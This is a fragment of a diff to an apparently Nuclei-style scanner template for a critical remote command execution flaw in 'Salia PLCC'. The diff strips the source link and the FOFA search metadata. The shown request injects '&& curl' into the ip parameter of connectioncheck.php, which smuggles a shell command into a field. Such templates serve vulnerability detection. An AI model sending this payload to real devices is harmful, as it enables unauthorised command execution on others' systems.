@@ -3,12 +3,8 @@ info:
   name: Salia PLCC 远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/exq794yb4bk6iimo'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: exq794yb4bk6iimo
-    fofa: '"Salia PLCC"'
 http:
 - raw:
   - 'GET /connectioncheck.php?ip=127.0.0.1+%26%26+curl+http%3A%2F%2Fwww.baidu.com HTTP/1.1
